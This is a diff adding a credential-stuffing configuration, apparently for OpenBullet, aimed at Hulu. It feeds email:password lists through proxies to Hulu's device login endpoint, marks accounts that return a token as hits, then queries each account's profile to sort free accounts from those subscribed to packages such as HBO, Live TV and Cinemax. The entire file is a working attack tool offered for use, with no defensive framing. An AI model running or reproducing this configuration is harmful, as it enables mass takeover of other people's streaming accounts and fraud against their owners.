@@ -1,0 +1,58 @@
+[SETTINGS]
+{
+  "Name": "Hulu",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-06T14:04:01.1069092+02:00",
+  "AdditionalInfo": "",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#LOGIN REQUEST POST "https://auth.hulu.com/v1/device/password/authenticate" AutoRedirect=TRUE 
+  CONTENT "affiliate_name=apple&friendly_name=Andy%27s+Iphone&password=<PASS>&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "user_token" 
+  KEYCHAIN Failure OR 
+    KEY "Your login is invalid" 
+#PARSE_TOKEN PARSE "<SOURCE>" JSON "user_token" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#GET_USER_INFO REQUEST GET "https://home.hulu.com/v1/users/self" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN CUSTOM "FREE" OR 
+    KEY "status\":null,\"subscriber_id\"" 
+    KEY "\"status\":\"6\",\"subscriber_id\"" 
+    KEY "\"status\":\"5\",\"subscriber_id\"" 
+    KEY "[\"1\",\"2\"]" 
+    KEY "package_ids\":[],\"" 
+#PARSE_PACKAGE_IDS PARSE "<SOURCE>" LR "package_ids\":[\"1\",\"2\"," "]" Recursive=FALSE -> VAR "IDS" "" "" 
+#REPLACE_1 FUNCTION Replace "\"14\"" "No Commercials" UseRegex=FALSE "<IDS>" -> VAR "IDS" 
+#REPLACE_2 FUNCTION Replace "\"16\"" "Live TV" UseRegex=FALSE "<IDS>" -> VAR "IDS" 
+#REPLACE_3 FUNCTION Replace "\"15\"" "ShowTime" UseRegex=FALSE "<IDS>" -> VAR "IDS" 
+#REPLACE_4 FUNCTION Replace "\"17\"" "HBO" UseRegex=FALSE "<IDS>" -> VAR "IDS" 
+#REPLACE_5 FUNCTION Replace "\"18\"" "Cinemax" UseRegex=FALSE "<IDS>" -> VAR "IDS" 
+#CAPTURE_PACKAGES PARSE "<IDS>" LR "" "" Recursive=FALSE -> CAP "Subscribed to" "" "" 
